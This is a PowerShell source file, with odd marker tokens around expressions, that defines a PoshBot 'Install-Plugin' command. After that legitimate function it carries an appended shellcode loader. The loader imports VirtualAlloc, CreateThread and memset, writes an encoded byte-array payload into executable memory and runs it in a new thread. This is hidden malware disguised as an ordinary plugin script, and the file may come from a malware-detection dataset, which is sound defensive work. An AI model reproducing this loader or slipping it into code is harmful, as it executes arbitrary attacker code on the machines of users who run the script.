
 -||-> function Install-Plugin {
    
    [PoshBot.BotCommand(
        Aliases = ( -||-> 'ip', 'installplugin' <-||- ),
        Permissions = 'manage-plugins'
    )]
    [cmdletbinding()]
    param(
        [parameter(Mandatory)]
        $Bot,

        [parameter(Mandatory, Position = 0)]
        [string]$Name,

        [parameter(Position = 1)]
        [ValidateScript({
             -||-> if ( -||-> $_ -as [Version] <-||- ) {
                 -||-> $true <-||- 
            } else {
                throw  -||-> 'Version parameter must be a valid semantic version string (1.2.3)' <-||- 
            } <-||- 
        })]
        [string]$Version
    )

     -||-> if ( -||-> $Name -ne 'Builtin' <-||- ) {

        
         -||-> if ( -||-> $PSBoundParameters.ContainsKey('Version') <-||- ) {
             -||-> $mod =  -||-> Get-Module -Name $Name -ListAvailable | Where-Object { -||-> $_.Version -eq $Version <-||- } <-||-  <-||- 
        } else {
             -||-> $mod = @( -||-> Get-Module -Name $Name -ListAvailable | Sort-Object -Property Version -Descending <-||- )[0] <-||- 
        } <-||- 
         -||-> if ( -||-> -not $mod <-||- ) {

            
             -||-> $findParams = @{
                Name =  -||-> $Name <-||- 
                Repository =  -||-> $bot.Configuration.PluginRepository <-||- 
                ErrorAction =  -||-> 'SilentlyContinue' <-||- 
            } <-||- 
             -||-> if ( -||-> $PSBoundParameters.ContainsKey('Version') <-||- ) {
                 -||-> $findParams.RequiredVersion = $Version <-||- 
            } <-||- 

             -||-> if ( -||-> $onlineMod =  -||-> Find-Module @findParams <-||-  <-||- ) {
                 -||-> $onlineMod | Install-Module -Scope CurrentUser -Force -AllowClobber <-||- 

                 -||-> if ( -||-> $PSBoundParameters.ContainsKey('Version') <-||- ) {
                     -||-> $mod =  -||-> Get-Module -Name $Name -ListAvailable | Where-Object { -||-> $_.Version -eq $Version <-||- } <-||-  <-||- 
                } else {
                     -||-> $mod = @( -||-> Get-Module -Name $Name -ListAvailable | Sort-Object -Property Version -Descending <-||- )[0] <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> if ( -||-> $mod <-||- ) {
             -||-> try {
                 -||-> $existingPlugin = $Bot.PluginManager.Plugins[$Name] <-||- 
                 -||-> $existingPluginVersions = $existingPlugin.Keys <-||- 
                 -||-> if ( -||-> $existingPluginVersions -notcontains $mod.Version <-||- ) {
                     -||-> $Bot.PluginManager.InstallPlugin($mod.Path, $true) <-||- 
                     -||-> $resp =  -||-> Get-Plugin -Bot $bot -Name $Name -Version $mod.Version <-||-  <-||- 
                     -||-> if ( -||-> -not ( -||-> $resp | Get-Member -Name 'Title' -MemberType NoteProperty <-||- ) <-||- ) {
                         -||-> $resp | Add-Member -Name 'Title' -MemberType NoteProperty -Value $null <-||- 
                    } <-||- 
                     -||-> $resp.Title = "Plugin [$Name] version [$( -||-> $mod.Version <-||- )] successfully installed" <-||- 
                } else {
                     -||-> $resp =  -||-> New-PoshBotCardResponse -Type Warning -Text "Plugin [$Name] version [$( -||-> $mod.Version <-||- )] is already installed" -Title 'Plugin already installed' <-||-  <-||- 
                } <-||- 
            } catch {
                 -||-> $resp =  -||-> New-PoshBotCardResponse -Type Error -Text $_.Exception.Message -Title 'Rut row' -ThumbnailUrl $thumb.rutrow <-||-  <-||- 
            } <-||- 
        } else {
             -||-> if ( -||-> $PSBoundParameters.ContainsKey('Version') <-||- ) {
                 -||-> $text = "Plugin [$Name] version [$Version] not found in configured plugin directory [$( -||-> $Bot.Configuration.PluginDirectory <-||- )], PSModulePath, or repository [$( -||-> $Bot.Configuration.PluginRepository <-||- )]" <-||- 
            } else {
                 -||-> $text = "Plugin [$Name] not found in configured plugin directory [$( -||-> $Bot.Configuration.PluginDirectory <-||- )], PSModulePath, or repository [$( -||-> $Bot.Configuration.PluginRepository <-||- )]" <-||- 
            } <-||- 
             -||-> $resp =  -||-> New-PoshBotCardResponse -Type Warning -Text $text -ThumbnailUrl 'http://p1cdn05.thewrap.com/images/2015/06/don-draper-shrug.jpg' <-||-  <-||- 
        } <-||- 
    } else {
         -||-> $resp =  -||-> New-PoshBotCardResponse -Type Warning -Text 'The builtin plugin is already... well... builtin :)' -Title 'Not gonna do it' <-||-  <-||- 
    } <-||- 

     -||-> $resp <-||- 
} <-||- 

 -||-> $ItF = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $ItF -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xcd,0xd9,0x74,0x24,0xf4,0x5b,0xbd,0xcc,0xd5,0x1f,0x88,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x6b,0x14,0x03,0x6b,0xd8,0x37,0xea,0x74,0x08,0x35,0x15,0x85,0xc8,0x5a,0x9f,0x60,0xf9,0x5a,0xfb,0xe1,0xa9,0x6a,0x8f,0xa4,0x45,0x00,0xdd,0x5c,0xde,0x64,0xca,0x53,0x57,0xc2,0x2c,0x5d,0x68,0x7f,0x0c,0xfc,0xea,0x82,0x41,0xde,0xd3,0x4c,0x94,0x1f,0x14,0xb0,0x55,0x4d,0xcd,0xbe,0xc8,0x62,0x7a,0x8a,0xd0,0x09,0x30,0x1a,0x51,0xed,0x80,0x1d,0x70,0xa0,0x9b,0x47,0x52,0x42,0x48,0xfc,0xdb,0x5c,0x8d,0x39,0x95,0xd7,0x65,0xb5,0x24,0x3e,0xb4,0x36,0x8a,0x7f,0x79,0xc5,0xd2,0xb8,0xbd,0x36,0xa1,0xb0,0xbe,0xcb,0xb2,0x06,0xbd,0x17,0x36,0x9d,0x65,0xd3,0xe0,0x79,0x94,0x30,0x76,0x09,0x9a,0xfd,0xfc,0x55,0xbe,0x00,0xd0,0xed,0xba,0x89,0xd7,0x21,0x4b,0xc9,0xf3,0xe5,0x10,0x89,0x9a,0xbc,0xfc,0x7c,0xa2,0xdf,0x5f,0x20,0x06,0xab,0x4d,0x35,0x3b,0xf6,0x19,0xfa,0x76,0x09,0xd9,0x94,0x01,0x7a,0xeb,0x3b,0xba,0x14,0x47,0xb3,0x64,0xe2,0xa8,0xee,0xd1,0x7c,0x57,0x11,0x22,0x54,0x93,0x45,0x72,0xce,0x32,0xe6,0x19,0x0e,0xbb,0x33,0xb7,0x0b,0x2b,0x7c,0xe0,0x14,0xcd,0x14,0xf3,0x14,0x10,0x5e,0x7a,0xf2,0x42,0xf0,0x2d,0xab,0x22,0xa0,0x8d,0x1b,0xca,0xaa,0x01,0x43,0xea,0xd4,0xcb,0xec,0x80,0x3a,0xa2,0x45,0x3c,0xa2,0xef,0x1e,0xdd,0x2b,0x3a,0x5b,0xdd,0xa0,0xc9,0x9b,0x93,0x40,0xa7,0x8f,0x43,0xa1,0xf2,0xf2,0xc5,0xbe,0x28,0x98,0xe9,0x2a,0xd7,0x0b,0xbe,0xc2,0xd5,0x6a,0x88,0x4c,0x25,0x59,0x83,0x45,0xb3,0x22,0xfb,0xa9,0x53,0xa3,0xfb,0xff,0x39,0xa3,0x93,0xa7,0x19,0xf0,0x86,0xa7,0xb7,0x64,0x1b,0x32,0x38,0xdd,0xc8,0x95,0x50,0xe3,0x37,0xd1,0xfe,0x1c,0x12,0xe3,0xc3,0xca,0x5a,0x91,0x2d,0xcf <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $1yC=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $1yC.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$1yC,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



